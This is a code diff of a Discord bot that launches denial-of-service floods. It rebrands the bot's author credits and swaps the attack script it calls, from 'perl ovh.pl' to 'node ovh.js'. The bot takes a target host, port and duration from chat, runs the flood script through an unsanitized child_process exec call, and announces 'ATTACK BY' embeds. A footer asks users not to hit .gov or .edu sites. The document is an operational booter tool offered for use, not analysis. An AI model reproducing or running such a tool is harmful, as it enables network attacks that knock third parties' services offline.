@@ -16,7 +16,7 @@ if (message.channel.id != room) {
 if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('ATTACK BY VenThings')
+	.setTitle('ATTACK BY LIZNDYA')
 	.setDescription("`example .ovh 1.1.1.1 22 90`")
 	.setFooter("pls don't attack .gov .edu")
 	message.channel.send(embed1);
@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl ovh.pl ${host} ${port} 65500 ${duration} 800`, (error, stdout, stderr) => {
+exec(`node ovh.js ${host} ${port} 65500 ${duration} 800`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -34,10 +34,10 @@ setTimeout(function(){
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ATTACK BY VenThings** 🚀')
+	.setTitle('🚀 **ATTACK BY LIZNDYA** 🚀')
 	.setTimestamp()
   .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `OVH 💣` \n **Time** : `" + duration + "`")
-	.setFooter('© Developer: VenThings#3280', client.user.avatarURL)
+	.setFooter('© Developer: ROMEO', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
@@ -56,10 +56,10 @@ var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
 console.log('Start Verify ID Discord:' +  message.guild.id)
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ATTACK BY VenThings** 🚀')
+	.setTitle('🚀 **ATTACK BY LIZNDYA** 🚀')
 	.setTimestamp()
 	.setDescription("**► Attack Loading **")
-	.setFooter('© Developer: VenThings#3280', client.user.avatarURL)
+	.setFooter('© Developer: ROMEO', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(loadinggif)
 	.setThumbnail("")
